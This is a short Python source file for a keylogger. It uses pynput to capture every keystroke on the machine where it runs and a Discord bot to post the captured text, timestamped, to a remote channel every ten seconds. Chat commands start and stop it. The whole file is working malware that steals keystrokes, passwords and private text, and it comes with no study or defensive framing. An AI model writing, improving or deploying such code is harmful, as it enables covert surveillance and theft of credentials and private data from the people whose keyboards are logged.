import os, asyncio
from dotenv import load_dotenv
import discord
import time
from discord.ext import commands
from pynput import keyboard

INTERVAL = 10
t = ""

load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")
if not TOKEN:
    raise SystemExit("DISCORD_TOKEN missing")

intents = discord.Intents.default()
intents.message_content = True
bot = discord.Client(intents=intents)

async def countdown(m, channel, flag):
    listen.start()
    while not flag.is_set():
        msg = await channel.send(f"Countdown: {INTERVAL}s")
        for rem in range(INTERVAL - 1, -1, -1):
            await asyncio.sleep(1)
            await msg.edit(content=f"Countdown: {rem}s")
        await msg.edit(content="Done!")
        await pull(channel)

async def stop(channel,flag):
    def check(m):
        return (m.content == "stop")
    await bot.wait_for("message", check = check)
    flag.set()
    listen.stop()
    await channel.send("Stopped Listening :3")

async def pull(channel):
    global t
    ts = time.strftime("%H:%M:%S")
    await channel.send(f"{ts}: {t}")
    t=""

@bot.event
async def on_message(message):
    if message.author.bot:
        return
    m = message.content

    if m == "start":     
        flag = asyncio.Event()
        asyncio.create_task(stop(message.channel,flag))
        asyncio.create_task(countdown(m,message.channel, flag))
    elif m == "bye bye":
        await bot.close()    

def on_press(key):
    global t
    try:
        t += key.char or ""
    except AttributeError:
        t += {"space": " ", "enter": "\n"}.get(getattr(key, "name", ""), f"[{getattr(key, 'name', key)}]")

listen = keyboard.Listener(on_press=on_press)

if __name__ == "__main__":
    bot.run(TOKEN)
